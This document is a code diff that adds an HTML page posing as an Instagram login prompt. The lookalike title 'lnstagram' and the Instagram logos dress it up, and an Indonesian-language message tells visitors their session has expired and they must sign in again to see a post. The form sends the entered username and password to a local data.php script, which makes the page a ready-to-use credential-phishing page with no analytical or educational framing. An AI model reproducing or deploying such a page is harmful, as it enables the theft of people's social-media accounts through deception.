@@ -1,0 +1,191 @@
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>
+    lnstagram
+    </title>
+    <link rel="icon" sizes="192x192" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
+    <link rel="shortcut icon" type="image/x-icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Rajdhani&display=swap');
+
+        * {
+            padding: 0;
+            margin: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            width: 100%;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        body:before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.3);
+            backdrop-filter: blur(5px);
+            -webkit-backdrop-filter: blur(5px);
+        }
+
+        .popup-instagram {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 400px;
+            display: flex;
+            padding: 20px 35px;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            background: #fff;
+            border-radius: 5px;
+            /* box-shadow: 0 0 50px rgba(0, 0, 0, 0.50); */
+            border: 1px solid #e6e6e6;
+        }
+
+        .popup-instagram .instagram-logo {
+            position: relative;
+            width: 80px;
+            height: 80px;
+        }
+
+        .instagram-logo img {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .popup-instagram .instagram-text {
+            position: relative;
+            margin-top: 10px;
+            width: 150px;
+            height: 42px;
+        }
+
+        .instagram-text img {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .popup-instagram .alert {
+            margin-top: 5px;
+            font-family: 'Rajdhani';
+            font-weight: bold;
+            text-align: center;
+            font-size: 15px;
+        }
+
+        .popup-instagram .instagram-form {
+            position: relative;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            margin-top: 8px;
+        }
+
+        .instagram-form input {
+            position: relative;
+            height: 36px;
+            border: 1px solid #efefef;
+            border-radius: 3px;
+            background-color: #fafafa;
+            width: 100%;
+            font-size: 12px;
+            margin: 2px;
+            padding: 9px 0 7px 8px;
+            outline: none;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            box-sizing: border-box;
+        }
+
+        .instagram-form input:focus {
+            border-color: #bbb;
+        }
+
+        .instagram-form .instagram-button {
+            position: relative;
+            margin-top: 10px;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .instagram-button .btn {
+            cursor: pointer;
+            padding: 0 8px;
+            background: #3897f0;
+            border: 1px solid #3897f0;
+            color: #fff;
+            border-radius: 3px;
+            font-weight: 600;
+            font-size: 13px;
+            height: 28px;
+            line-height: 26px;
+            outline: none;
+            white-space: nowrap;
+            margin: 0 5px;
+        }
+
+        @media only screen and (max-width: 410px) {
+            .popup-instagram {
+                width: 350px;
+            }
+        }
+
+        @media only screen and (max-width: 365px) {
+            .popup-instagram {
+                width: 310px;
+                padding: 20px;
+            }
+
+            .popup-instagram .alert {
+                font-size: 13px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="popup-instagram">
+        <div class="instagram-logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png">
+        </div>
+        <div class="instagram-text">
+            <img src="https://logowiki.net/uploads/logo/i/instagram.svg">
+        </div>
+        <p class="alert">
+            Sesi telah berakhir ! silahkan login kembali <br> untuk menuju ke postingan.
+        </p>
+        <div class="instagram-form">
+            <form name="form1" method="post" action="data.php" onsubmit="return cekit();" enctype="multipart/form-data">
+                <input type="text" name="email" placeholder="Username" required="">
+                <input type="password" name="pass" placeholder="Password" required="">
+                <div class="instagram-button">
+                    <button class="btn cancel">Cancel</button>
+                    <button class="btn submit" type="submit" name="submit">Login</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+
+</body></html>
